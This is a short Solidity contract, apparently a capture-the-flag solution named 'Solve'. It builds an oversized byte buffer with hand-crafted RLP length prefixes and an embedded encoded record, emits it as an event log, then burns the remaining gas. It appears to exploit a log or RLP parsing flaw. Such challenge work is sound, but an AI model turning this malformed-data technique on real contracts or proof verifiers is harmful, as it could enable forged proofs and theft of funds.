// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Solve {
    event SolveLog(bytes data);
    bytes data;

    function prime1() public { 
        bytes memory dat = new bytes(31808);        
        for (uint256 i = 0; i < 31808; i++) {
            dat[i] = 0x41;
        }
        dat[60] = 0xb9;
        dat[61] = 0x01;
        dat[62] = 0x00;
	uint8[62] memory target_rlp = [249, 0, 59, 249, 0, 56, 148, 229, 24, 182, 3, 201, 241, 129, 68, 41, 137, 35, 15, 146, 37, 171, 84, 223, 89, 209, 131, 225, 160, 137, 74, 227, 239, 27, 132, 164, 51, 193, 75, 189, 67, 195, 108, 235, 114, 132, 187, 83, 169, 242, 44, 237, 123, 36, 181, 27, 231, 182, 119, 165, 20, 128];
        for (uint256 i = 0; i < target_rlp.length; i++) {
            dat[i + 319] = bytes1(target_rlp[i]);
        }
        dat[381] = 0xb9;
        dat[382] = 0xff;
        dat[383] = 0xff;
        data = dat;
    }

    function prime2() public {
        bytes memory extension = new bytes(31808);
        for (uint256 i = 0; i < 31808; i++) {
            extension[i] = 0x42;
        }
        data = bytes.concat(data, extension);
    }

    function getData() public view returns (bytes memory) {
        return data;
    }

    function solve() public {
        emit SolveLog(data);
        assembly {
            for { } gt(gas(), 100) { } {
                pop(codesize())
            }
            stop()
        }
    }
}

